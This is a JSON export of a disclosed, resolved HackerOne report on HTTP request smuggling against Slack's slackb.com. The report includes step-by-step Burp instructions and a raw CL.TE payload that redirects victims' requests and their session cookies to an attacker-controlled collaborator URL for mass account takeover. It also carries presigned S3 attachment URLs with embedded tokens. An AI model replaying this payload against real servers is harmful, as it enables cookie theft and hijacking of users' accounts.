@@ -1,0 +1,290 @@
+{
+  "id": 737140,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzcxNDA=",
+  "url": "https://hackerone.com/reports/737140",
+  "title": "Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-11-14T00:07:59.113Z",
+  "submitted_at": "2019-11-14T00:07:59.113Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "defparam",
+    "url": "/defparam",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/i50w29os1otgiy5sdiwmaujw4sam/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 69,
+    "url": "https://hackerone.com/slack",
+    "handle": "slack",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Slack",
+      "twitter_handle": "slackhq",
+      "website": "https://slack.com",
+      "about": "All your team communication in one place, instantly searchable, and available wherever you go."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-03-12T00:29:01.426Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-03-12T00:02:11.795Z",
+  "team_member_agreed_on_going_public_at": "2020-03-12T00:29:01.268Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Slack Security Team!\n\nMy name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a month long bounty promotion I decided to take a little of my time and gently perform recon on your platform. Specifically the area of interest I focus in is HTTP Request Smuggling. I developed tooling to actively target some advanced HTTP Smuggling exploits and ran it on your in-scope assets. In my research I stumbled across a finding that I consider extremely critical not only for Slack but for all customers and organizations which share their privatedata/channels/conversations on Slack.\n\nThe bug chain is as follows:\n1) HTTP Request Smuggling CTLE to Arbitrary Request Hijacking (Poisoned Socket) on `slackb.com`\n2) Request Hijack forces victim HTTP requests to instead use `GET https://<URL> HTTP/1.1` on `slackb.com`\n3) A request of `GET https://<URL> HTTP/1.1` on the backend server socket results in a 301 redirect to `https://<URL>` with slack cookies (most importantly the `d` cookie)\n4) Me with my Burp Collaborator steals victims cookies by using a collaborator server as the defined <URL> in the attack\n5) Me (if I were evil) collects massive amounts of `d` session cookies and steals any/all possble Slack user/organization data from victim sessions\n\nSo let's start from the beginning. I was running `smuggler -u https://slackb.com` running my array of exhaustive tests when I stumbled upon a failure with test: `space1` (see below)\n\n{F633736}\n\nThe `space1` tests checks for HTTP desync with the following payload:\n\n{F633737}\n\nThis testcase failed on testing a CLTE and not a TECL. A CLTE is a webrequest that has both the `Transfer-Encoding: chunked` header (specified in some abnormal way) and the `Content-Length: ` header. According to the RFC when both headers are specified the TE always takes priority. However, if the TE header is malformed the webrequest may get interpreted differently between the frontend and the backend server. The CLTE issue found on slackb.com is when the frontend server interprets the request sized using `Content-Length` and the backend server interprets the request using the `Transfer-Encoding: chunked` method. This causes a desync on the webrequest and can poison the backend socket causing data to be pre-pended to the next webrequest from a victim. The `space1` payload places a space character in between `Transfer-Encoding` and the colon `:`. This is enough for the frontend to not understand the request as TE and instead as CE but not enough for the backend to process it in the same way.\n\nOne popular attack with a CLTE is to prepend data to the next request that would \"erase\" the victim's HTTP request using a custom header semantic and for the poison socket data to re-specify the HTTP method and endpoint. Here is what the payload looks like with the `slackb.com` attack. The best way I can explain it is through Visio using these diagrams (see below)\n\n{F633741}\n\nExplanation of the malicious request:\n\n{F633743}\n\nHere are your steps to triage:\n1) Open up a fresh Burp\n2) Open up a fresh Collaborator by going to menu: `Burp->Burp Collaborator Client`\n3) In the Collaborator Client click on `Copy to clipboard` for the server URL\n4) Go to the Repeater tab\n5) Add the following payload and replace <URL> with your collaborator URL\n```\nGET / HTTP/1.1\nTransfer-Encoding : chunked\nHost: slackb.com\nUser-Agent: Smuggler/v1.0\nContent-Length: 83\n\n0\n\nGET <URL> HTTP/1.1\nX: X\n```\n6) Set the repeater target to: `host: slackb.com , Port: 443 (SSL)`  by double clicking on target\n7) Press go\n8) In the Collaborator window click `Poll now` until you see requests\n\nThe attack should roughly look like this:\nBurp Repeater:\n{F633745}\n\nCollaborator DNS request: (The Victim's IP Address is leaked too!)\n{F633746}\n\nThe special cookie stolen from this attack:\n{F633749}\n\nAt this point you just attacked an arbitrary slack customer and have access to her `d` session cookie.\nFrom here you can plug the session cookie into your browser and have full account takeover, Scrape all data and move onto the next victim.\n\nI'm happy to help if you have any further questions. Most of my requests have been made using the `User-Agent: Smuggler/v1.0` header, feel free to review traffic logs keying off that.\n\nHave a nice day!\nBest,\nEvan\n\n## Impact\n\nSo it is my opinion that this is a severe critical vulnerability that could lead to a massive data breach of a majority of customer data. With this attack it would be trivial for a bad actor to create bots that consistantly issue this attack, jump onto the victim session and steal all possible data within reach. \n\nI am really happy I found this for you guys so that it can be dealt with ASAP. I really hope there haven't been any attacks on customers using this vulnerability.\n\nBest Wishes,\nEvan",
+  "weakness": {
+    "id": 86,
+    "name": "HTTP Request Smuggling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 633736,
+      "file_name": "s1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/18MGYr9nAqguSUF59Y9s3RKS?response-content-disposition=attachment%3B%20filename%3D%22s1.png%22%3B%20filename%2A%3DUTF-8%27%27s1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZG4MQT7O%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051226Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDpCLqHT5j%2BIjGbYt1ac1RtY4KVfgoRMDwH%2FRHWf2c%2B5wIhALK4goMIUg5YuUD97zcbUUwPQChPuJRCvYhkCSis0D1lKrIFCH0QAxoMMDEzNjE5Mjc0ODQ5IgxA0dF4oo1hb7R%2FmewqjwWsdoU2surJ%2FaeyIBPpEkwESrKk7U%2FJqC7Y6CsULthxu2l2VORJJkCMMcUu%2BUM4BKD6UxytuazFyvpWzmw1YApvmytGG8A%2FrOw3OkqTm14Tf6I6JRX3z66IFoDL0f8c1%2FtdXcT%2FU4SWzobIFyQ%2BkycvP%2BbxDxE6qD6KhwAiMS6XNgFVUaED4oeSkEhGG5%2BvsEPpDkazW4IQd5E0NR0Go9DTxM49a1glQSnbA3%2FFlQ66%2B9E47sM%2BcxLlfeDauym%2FEWtpz6RbV5YvOvp1p1SmFrQnCWmZfZZxP3T0UJ1H1EZaB8Z0VcJPeaq0syiYzf5tkk735knjQB0timOZ4kO8jLQW%2BJKmPwEsT8oCidHcM%2Ftid88z1ty26We0HJ0NF%2FHcE4XbKWLEXRMWUMm%2Fnw5wliZ%2BvhBfq3XoVKBWrSxzHkjmxtuNu3USUV%2BPMqTO5UfU12hibdGRV%2F644LcPPYGc%2FLDxi2eTbhKcooN4MIy%2BqPnHDSCRSJQg54oRqHQzcSKrvu6urbyyuQmuWD6W0OdSjxfx6SimpUWsKFtR%2FcoEKShg9KLA8m%2BLEUs65bXmhexvbJwHi7YMF1Aeqm0UfPJjA5pEADTwz0f8ZmelAqQDGIb%2FeXH9HnXDImPFjR1Dh6%2Bs5l3iUZFktJ9K5VkjaNMEOJYqJtm4yrS3ZZrTwbTUiIh559Vs5HegNil2%2BxvdGItHWxYO1aG8tNeSoI6lMhNY7zeK0nPYloxk9Xf7htUDoh5QxZYMdMwMICF%2FQQ%2F1Mvh3EwXNJuwtrgGF1fkXpXES9vDJQmcwgDzOzgBOwsUIDIsdXsfmo7pG2Kagls8uBdXwELGxQ%2BAwYqgsx%2FfyjnTWZP0gSL8a3uhavIPJTyNotnMRMMGXt9IGOrABA60ddC8t9Hc9w0j0HWn%2FIBCY5x5mrXQllMtjmHKPiWe4kT11GetMBOZODMEpWkFoHvfoxjksWQbYFmtXs6HczffjUyvzb5wm4H6rqeqRrkGbdi9NDODc%2FLVjY6DzOGdzJFxvTfRvBPO7aUo436qZlyy%2BACMhU5U3Qulyld%2BR%2FRN7U8h7SoxAWmvfAIur%2BNQTa2RJoSy%2BbzB4arAvZZfHNbbzbUTv%2Fp29121Byyk6dsQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=409200a83bf53d42afcc7eb25b69733636d4831425ce0ce687a39a846e3f6be7",
+      "file_size": 477732,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 633737,
+      "file_name": "s2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/WVzUzbnF5FshKewG53gwDZwY?response-content-disposition=attachment%3B%20filename%3D%22s2.png%22%3B%20filename%2A%3DUTF-8%27%27s2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZG4MQT7O%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051226Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDpCLqHT5j%2BIjGbYt1ac1RtY4KVfgoRMDwH%2FRHWf2c%2B5wIhALK4goMIUg5YuUD97zcbUUwPQChPuJRCvYhkCSis0D1lKrIFCH0QAxoMMDEzNjE5Mjc0ODQ5IgxA0dF4oo1hb7R%2FmewqjwWsdoU2surJ%2FaeyIBPpEkwESrKk7U%2FJqC7Y6CsULthxu2l2VORJJkCMMcUu%2BUM4BKD6UxytuazFyvpWzmw1YApvmytGG8A%2FrOw3OkqTm14Tf6I6JRX3z66IFoDL0f8c1%2FtdXcT%2FU4SWzobIFyQ%2BkycvP%2BbxDxE6qD6KhwAiMS6XNgFVUaED4oeSkEhGG5%2BvsEPpDkazW4IQd5E0NR0Go9DTxM49a1glQSnbA3%2FFlQ66%2B9E47sM%2BcxLlfeDauym%2FEWtpz6RbV5YvOvp1p1SmFrQnCWmZfZZxP3T0UJ1H1EZaB8Z0VcJPeaq0syiYzf5tkk735knjQB0timOZ4kO8jLQW%2BJKmPwEsT8oCidHcM%2Ftid88z1ty26We0HJ0NF%2FHcE4XbKWLEXRMWUMm%2Fnw5wliZ%2BvhBfq3XoVKBWrSxzHkjmxtuNu3USUV%2BPMqTO5UfU12hibdGRV%2F644LcPPYGc%2FLDxi2eTbhKcooN4MIy%2BqPnHDSCRSJQg54oRqHQzcSKrvu6urbyyuQmuWD6W0OdSjxfx6SimpUWsKFtR%2FcoEKShg9KLA8m%2BLEUs65bXmhexvbJwHi7YMF1Aeqm0UfPJjA5pEADTwz0f8ZmelAqQDGIb%2FeXH9HnXDImPFjR1Dh6%2Bs5l3iUZFktJ9K5VkjaNMEOJYqJtm4yrS3ZZrTwbTUiIh559Vs5HegNil2%2BxvdGItHWxYO1aG8tNeSoI6lMhNY7zeK0nPYloxk9Xf7htUDoh5QxZYMdMwMICF%2FQQ%2F1Mvh3EwXNJuwtrgGF1fkXpXES9vDJQmcwgDzOzgBOwsUIDIsdXsfmo7pG2Kagls8uBdXwELGxQ%2BAwYqgsx%2FfyjnTWZP0gSL8a3uhavIPJTyNotnMRMMGXt9IGOrABA60ddC8t9Hc9w0j0HWn%2FIBCY5x5mrXQllMtjmHKPiWe4kT11GetMBOZODMEpWkFoHvfoxjksWQbYFmtXs6HczffjUyvzb5wm4H6rqeqRrkGbdi9NDODc%2FLVjY6DzOGdzJFxvTfRvBPO7aUo436qZlyy%2BACMhU5U3Qulyld%2BR%2FRN7U8h7SoxAWmvfAIur%2BNQTa2RJoSy%2BbzB4arAvZZfHNbbzbUTv%2Fp29121Byyk6dsQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8a0d6afc3acf2f33dd1053042ed5a2fe0420327c5635f1b58ad863086fb8d109",
+      "file_size": 17324,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 633741,
+      "file_name": "CLTE_explained.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7WA5jrCW1ujKbyJgwnXGb2Mo?response-content-disposition=attachment%3B%20filename%3D%22CLTE_explained.png%22%3B%20filename%2A%3DUTF-8%27%27CLTE_explained.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZG4MQT7O%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051226Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDpCLqHT5j%2BIjGbYt1ac1RtY4KVfgoRMDwH%2FRHWf2c%2B5wIhALK4goMIUg5YuUD97zcbUUwPQChPuJRCvYhkCSis0D1lKrIFCH0QAxoMMDEzNjE5Mjc0ODQ5IgxA0dF4oo1hb7R%2FmewqjwWsdoU2surJ%2FaeyIBPpEkwESrKk7U%2FJqC7Y6CsULthxu2l2VORJJkCMMcUu%2BUM4BKD6UxytuazFyvpWzmw1YApvmytGG8A%2FrOw3OkqTm14Tf6I6JRX3z66IFoDL0f8c1%2FtdXcT%2FU4SWzobIFyQ%2BkycvP%2BbxDxE6qD6KhwAiMS6XNgFVUaED4oeSkEhGG5%2BvsEPpDkazW4IQd5E0NR0Go9DTxM49a1glQSnbA3%2FFlQ66%2B9E47sM%2BcxLlfeDauym%2FEWtpz6RbV5YvOvp1p1SmFrQnCWmZfZZxP3T0UJ1H1EZaB8Z0VcJPeaq0syiYzf5tkk735knjQB0timOZ4kO8jLQW%2BJKmPwEsT8oCidHcM%2Ftid88z1ty26We0HJ0NF%2FHcE4XbKWLEXRMWUMm%2Fnw5wliZ%2BvhBfq3XoVKBWrSxzHkjmxtuNu3USUV%2BPMqTO5UfU12hibdGRV%2F644LcPPYGc%2FLDxi2eTbhKcooN4MIy%2BqPnHDSCRSJQg54oRqHQzcSKrvu6urbyyuQmuWD6W0OdSjxfx6SimpUWsKFtR%2FcoEKShg9KLA8m%2BLEUs65bXmhexvbJwHi7YMF1Aeqm0UfPJjA5pEADTwz0f8ZmelAqQDGIb%2FeXH9HnXDImPFjR1Dh6%2Bs5l3iUZFktJ9K5VkjaNMEOJYqJtm4yrS3ZZrTwbTUiIh559Vs5HegNil2%2BxvdGItHWxYO1aG8tNeSoI6lMhNY7zeK0nPYloxk9Xf7htUDoh5QxZYMdMwMICF%2FQQ%2F1Mvh3EwXNJuwtrgGF1fkXpXES9vDJQmcwgDzOzgBOwsUIDIsdXsfmo7pG2Kagls8uBdXwELGxQ%2BAwYqgsx%2FfyjnTWZP0gSL8a3uhavIPJTyNotnMRMMGXt9IGOrABA60ddC8t9Hc9w0j0HWn%2FIBCY5x5mrXQllMtjmHKPiWe4kT11GetMBOZODMEpWkFoHvfoxjksWQbYFmtXs6HczffjUyvzb5wm4H6rqeqRrkGbdi9NDODc%2FLVjY6DzOGdzJFxvTfRvBPO7aUo436qZlyy%2BACMhU5U3Qulyld%2BR%2FRN7U8h7SoxAWmvfAIur%2BNQTa2RJoSy%2BbzB4arAvZZfHNbbzbUTv%2Fp29121Byyk6dsQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b99e81879d9df02584d7f82e2784dfc00e6244617d93c356530c3746faa7ff04",
+      "file_size": 104180,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 633743,
+      "file_name": "Redirect_Explained.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RT6PWXQ2fyC5K3aUmw69wRS7?response-content-disposition=attachment%3B%20filename%3D%22Redirect_Explained.png%22%3B%20filename%2A%3DUTF-8%27%27Redirect_Explained.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZG4MQT7O%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051226Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDpCLqHT5j%2BIjGbYt1ac1RtY4KVfgoRMDwH%2FRHWf2c%2B5wIhALK4goMIUg5YuUD97zcbUUwPQChPuJRCvYhkCSis0D1lKrIFCH0QAxoMMDEzNjE5Mjc0ODQ5IgxA0dF4oo1hb7R%2FmewqjwWsdoU2surJ%2FaeyIBPpEkwESrKk7U%2FJqC7Y6CsULthxu2l2VORJJkCMMcUu%2BUM4BKD6UxytuazFyvpWzmw1YApvmytGG8A%2FrOw3OkqTm14Tf6I6JRX3z66IFoDL0f8c1%2FtdXcT%2FU4SWzobIFyQ%2BkycvP%2BbxDxE6qD6KhwAiMS6XNgFVUaED4oeSkEhGG5%2BvsEPpDkazW4IQd5E0NR0Go9DTxM49a1glQSnbA3%2FFlQ66%2B9E47sM%2BcxLlfeDauym%2FEWtpz6RbV5YvOvp1p1SmFrQnCWmZfZZxP3T0UJ1H1EZaB8Z0VcJPeaq0syiYzf5tkk735knjQB0timOZ4kO8jLQW%2BJKmPwEsT8oCidHcM%2Ftid88z1ty26We0HJ0NF%2FHcE4XbKWLEXRMWUMm%2Fnw5wliZ%2BvhBfq3XoVKBWrSxzHkjmxtuNu3USUV%2BPMqTO5UfU12hibdGRV%2F644LcPPYGc%2FLDxi2eTbhKcooN4MIy%2BqPnHDSCRSJQg54oRqHQzcSKrvu6urbyyuQmuWD6W0OdSjxfx6SimpUWsKFtR%2FcoEKShg9KLA8m%2BLEUs65bXmhexvbJwHi7YMF1Aeqm0UfPJjA5pEADTwz0f8ZmelAqQDGIb%2FeXH9HnXDImPFjR1Dh6%2Bs5l3iUZFktJ9K5VkjaNMEOJYqJtm4yrS3ZZrTwbTUiIh559Vs5HegNil2%2BxvdGItHWxYO1aG8tNeSoI6lMhNY7zeK0nPYloxk9Xf7htUDoh5QxZYMdMwMICF%2FQQ%2F1Mvh3EwXNJuwtrgGF1fkXpXES9vDJQmcwgDzOzgBOwsUIDIsdXsfmo7pG2Kagls8uBdXwELGxQ%2BAwYqgsx%2FfyjnTWZP0gSL8a3uhavIPJTyNotnMRMMGXt9IGOrABA60ddC8t9Hc9w0j0HWn%2FIBCY5x5mrXQllMtjmHKPiWe4kT11GetMBOZODMEpWkFoHvfoxjksWQbYFmtXs6HczffjUyvzb5wm4H6rqeqRrkGbdi9NDODc%2FLVjY6DzOGdzJFxvTfRvBPO7aUo436qZlyy%2BACMhU5U3Qulyld%2BR%2FRN7U8h7SoxAWmvfAIur%2BNQTa2RJoSy%2BbzB4arAvZZfHNbbzbUTv%2Fp29121Byyk6dsQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bf0ffe451c89028beeb30f7fd814a47e028d5fc54c8843d1771c95342ceb6c3d",
+      "file_size": 62028,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 633745,
+      "file_name": "burp_1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/EZAugTeu82De2t3Y5LBNLSZG?response-content-disposition=attachment%3B%20filename%3D%22burp_1.png%22%3B%20filename%2A%3DUTF-8%27%27burp_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZG4MQT7O%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051226Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDpCLqHT5j%2BIjGbYt1ac1RtY4KVfgoRMDwH%2FRHWf2c%2B5wIhALK4goMIUg5YuUD97zcbUUwPQChPuJRCvYhkCSis0D1lKrIFCH0QAxoMMDEzNjE5Mjc0ODQ5IgxA0dF4oo1hb7R%2FmewqjwWsdoU2surJ%2FaeyIBPpEkwESrKk7U%2FJqC7Y6CsULthxu2l2VORJJkCMMcUu%2BUM4BKD6UxytuazFyvpWzmw1YApvmytGG8A%2FrOw3OkqTm14Tf6I6JRX3z66IFoDL0f8c1%2FtdXcT%2FU4SWzobIFyQ%2BkycvP%2BbxDxE6qD6KhwAiMS6XNgFVUaED4oeSkEhGG5%2BvsEPpDkazW4IQd5E0NR0Go9DTxM49a1glQSnbA3%2FFlQ66%2B9E47sM%2BcxLlfeDauym%2FEWtpz6RbV5YvOvp1p1SmFrQnCWmZfZZxP3T0UJ1H1EZaB8Z0VcJPeaq0syiYzf5tkk735knjQB0timOZ4kO8jLQW%2BJKmPwEsT8oCidHcM%2Ftid88z1ty26We0HJ0NF%2FHcE4XbKWLEXRMWUMm%2Fnw5wliZ%2BvhBfq3XoVKBWrSxzHkjmxtuNu3USUV%2BPMqTO5UfU12hibdGRV%2F644LcPPYGc%2FLDxi2eTbhKcooN4MIy%2BqPnHDSCRSJQg54oRqHQzcSKrvu6urbyyuQmuWD6W0OdSjxfx6SimpUWsKFtR%2FcoEKShg9KLA8m%2BLEUs65bXmhexvbJwHi7YMF1Aeqm0UfPJjA5pEADTwz0f8ZmelAqQDGIb%2FeXH9HnXDImPFjR1Dh6%2Bs5l3iUZFktJ9K5VkjaNMEOJYqJtm4yrS3ZZrTwbTUiIh559Vs5HegNil2%2BxvdGItHWxYO1aG8tNeSoI6lMhNY7zeK0nPYloxk9Xf7htUDoh5QxZYMdMwMICF%2FQQ%2F1Mvh3EwXNJuwtrgGF1fkXpXES9vDJQmcwgDzOzgBOwsUIDIsdXsfmo7pG2Kagls8uBdXwELGxQ%2BAwYqgsx%2FfyjnTWZP0gSL8a3uhavIPJTyNotnMRMMGXt9IGOrABA60ddC8t9Hc9w0j0HWn%2FIBCY5x5mrXQllMtjmHKPiWe4kT11GetMBOZODMEpWkFoHvfoxjksWQbYFmtXs6HczffjUyvzb5wm4H6rqeqRrkGbdi9NDODc%2FLVjY6DzOGdzJFxvTfRvBPO7aUo436qZlyy%2BACMhU5U3Qulyld%2BR%2FRN7U8h7SoxAWmvfAIur%2BNQTa2RJoSy%2BbzB4arAvZZfHNbbzbUTv%2Fp29121Byyk6dsQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ee0909cca780ddae8d7b49fd4197bee8716dac82290d1e0f362706d122ba8d9d",
+      "file_size": 43696,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 633746,
+      "file_name": "collab_1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gFpsAzo6xeV8pbnN715ymr5c?response-content-disposition=attachment%3B%20filename%3D%22collab_1.png%22%3B%20filename%2A%3DUTF-8%27%27collab_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZG4MQT7O%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051226Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDpCLqHT5j%2BIjGbYt1ac1RtY4KVfgoRMDwH%2FRHWf2c%2B5wIhALK4goMIUg5YuUD97zcbUUwPQChPuJRCvYhkCSis0D1lKrIFCH0QAxoMMDEzNjE5Mjc0ODQ5IgxA0dF4oo1hb7R%2FmewqjwWsdoU2surJ%2FaeyIBPpEkwESrKk7U%2FJqC7Y6CsULthxu2l2VORJJkCMMcUu%2BUM4BKD6UxytuazFyvpWzmw1YApvmytGG8A%2FrOw3OkqTm14Tf6I6JRX3z66IFoDL0f8c1%2FtdXcT%2FU4SWzobIFyQ%2BkycvP%2BbxDxE6qD6KhwAiMS6XNgFVUaED4oeSkEhGG5%2BvsEPpDkazW4IQd5E0NR0Go9DTxM49a1glQSnbA3%2FFlQ66%2B9E47sM%2BcxLlfeDauym%2FEWtpz6RbV5YvOvp1p1SmFrQnCWmZfZZxP3T0UJ1H1EZaB8Z0VcJPeaq0syiYzf5tkk735knjQB0timOZ4kO8jLQW%2BJKmPwEsT8oCidHcM%2Ftid88z1ty26We0HJ0NF%2FHcE4XbKWLEXRMWUMm%2Fnw5wliZ%2BvhBfq3XoVKBWrSxzHkjmxtuNu3USUV%2BPMqTO5UfU12hibdGRV%2F644LcPPYGc%2FLDxi2eTbhKcooN4MIy%2BqPnHDSCRSJQg54oRqHQzcSKrvu6urbyyuQmuWD6W0OdSjxfx6SimpUWsKFtR%2FcoEKShg9KLA8m%2BLEUs65bXmhexvbJwHi7YMF1Aeqm0UfPJjA5pEADTwz0f8ZmelAqQDGIb%2FeXH9HnXDImPFjR1Dh6%2Bs5l3iUZFktJ9K5VkjaNMEOJYqJtm4yrS3ZZrTwbTUiIh559Vs5HegNil2%2BxvdGItHWxYO1aG8tNeSoI6lMhNY7zeK0nPYloxk9Xf7htUDoh5QxZYMdMwMICF%2FQQ%2F1Mvh3EwXNJuwtrgGF1fkXpXES9vDJQmcwgDzOzgBOwsUIDIsdXsfmo7pG2Kagls8uBdXwELGxQ%2BAwYqgsx%2FfyjnTWZP0gSL8a3uhavIPJTyNotnMRMMGXt9IGOrABA60ddC8t9Hc9w0j0HWn%2FIBCY5x5mrXQllMtjmHKPiWe4kT11GetMBOZODMEpWkFoHvfoxjksWQbYFmtXs6HczffjUyvzb5wm4H6rqeqRrkGbdi9NDODc%2FLVjY6DzOGdzJFxvTfRvBPO7aUo436qZlyy%2BACMhU5U3Qulyld%2BR%2FRN7U8h7SoxAWmvfAIur%2BNQTa2RJoSy%2BbzB4arAvZZfHNbbzbUTv%2Fp29121Byyk6dsQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c9c551ff37b604e71d0a66708efb3aae234e6a9e3ff621c6c26b64083569f654",
+      "file_size": 29280,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 633749,
+      "file_name": "collab_2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/EAvaV1kCGL2FaSnCjWsCxmBW?response-content-disposition=attachment%3B%20filename%3D%22collab_2.png%22%3B%20filename%2A%3DUTF-8%27%27collab_2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZG4MQT7O%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051226Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDpCLqHT5j%2BIjGbYt1ac1RtY4KVfgoRMDwH%2FRHWf2c%2B5wIhALK4goMIUg5YuUD97zcbUUwPQChPuJRCvYhkCSis0D1lKrIFCH0QAxoMMDEzNjE5Mjc0ODQ5IgxA0dF4oo1hb7R%2FmewqjwWsdoU2surJ%2FaeyIBPpEkwESrKk7U%2FJqC7Y6CsULthxu2l2VORJJkCMMcUu%2BUM4BKD6UxytuazFyvpWzmw1YApvmytGG8A%2FrOw3OkqTm14Tf6I6JRX3z66IFoDL0f8c1%2FtdXcT%2FU4SWzobIFyQ%2BkycvP%2BbxDxE6qD6KhwAiMS6XNgFVUaED4oeSkEhGG5%2BvsEPpDkazW4IQd5E0NR0Go9DTxM49a1glQSnbA3%2FFlQ66%2B9E47sM%2BcxLlfeDauym%2FEWtpz6RbV5YvOvp1p1SmFrQnCWmZfZZxP3T0UJ1H1EZaB8Z0VcJPeaq0syiYzf5tkk735knjQB0timOZ4kO8jLQW%2BJKmPwEsT8oCidHcM%2Ftid88z1ty26We0HJ0NF%2FHcE4XbKWLEXRMWUMm%2Fnw5wliZ%2BvhBfq3XoVKBWrSxzHkjmxtuNu3USUV%2BPMqTO5UfU12hibdGRV%2F644LcPPYGc%2FLDxi2eTbhKcooN4MIy%2BqPnHDSCRSJQg54oRqHQzcSKrvu6urbyyuQmuWD6W0OdSjxfx6SimpUWsKFtR%2FcoEKShg9KLA8m%2BLEUs65bXmhexvbJwHi7YMF1Aeqm0UfPJjA5pEADTwz0f8ZmelAqQDGI